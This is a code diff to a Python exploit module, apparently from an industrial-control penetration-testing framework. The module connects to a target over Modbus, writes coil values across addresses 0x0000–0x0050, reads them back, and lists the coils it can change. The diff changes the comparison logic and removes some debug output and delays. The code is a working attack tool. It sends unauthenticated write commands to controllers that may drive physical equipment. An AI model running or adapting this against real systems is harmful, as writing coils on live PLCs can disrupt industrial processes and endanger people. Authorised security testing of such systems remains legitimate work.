@@ -32,7 +32,6 @@ class Module:
     output = ""
     address = []
 
-
     def exploit(self):
 
         moduleName = self.info["Name"]
@@ -74,14 +73,13 @@ class Module:
             print(str)
 
     def do(self, ip):
-        for i in range(0, 0x0050, int(self.options["Quantity"][0], 16)):
+        for i in range(0x0000, 0x0050, int(self.options["Quantity"][0], 16)):
             c = connectToTarget(ip, self.options["RPORT"][0])
             if c is None:
                 self.printLine("[-] Modbus is not running on : " + ip, bcolors.WARNING)
                 return None
             self.printLine("[+] Connecting to " + ip, bcolors.OKGREEN)
             print(f"Address {hex(i)} ".center(20, "#"))
-            sleep(2)
             # 先写入0x0000
             ans = c.sr1(
                 ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
@@ -93,7 +91,6 @@ class Module:
                 verbose=0,
             )
             ans = ModbusADU_Answer(bytes(ans))
-            print(f"write first:{ans}")
             sleep(2)
             # 再读取写入的值
             ans = c.sr1(
@@ -107,10 +104,10 @@ class Module:
             )
             ans = ModbusADU_Answer(bytes(ans))
             print(f"read first:{ans}")
-            sleep(2)
             ## 保存读到的线圈值
-            read_1 = 1 if bytes(ans)[-1] == 0x00 else -1
-            # 写一次值0xff00
+            read_1 = bytes(ans)[-1]
+            sleep(2)
+            # 写入0xff00
             ans = c.sr1(
                 ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                 / ModbusPDU05_Write_Single_Coil(
@@ -121,7 +118,6 @@ class Module:
                 verbose=0,
             )
             ans = ModbusADU_Answer(bytes(ans))
-            print(f"write second:{ans}")
             sleep(2)
             # 第二次读线圈值，与我们写入的值比较
             ans = c.sr1(
@@ -136,8 +132,8 @@ class Module:
             ans = ModbusADU_Answer(bytes(ans))
             print(f"read second:{ans}")
             ## 保存读到的线圈值
-            read_2 = 1 if bytes(ans)[-1] == 0x01 else -1
-            if read_1 + read_2 == 2:
+            read_2 = bytes(ans)[-1]
+            if read_1 != read_2:
                 print(f"{hex(i)} address can be modifiable!")
                 self.address.append(hex(i))
         print(self.address)
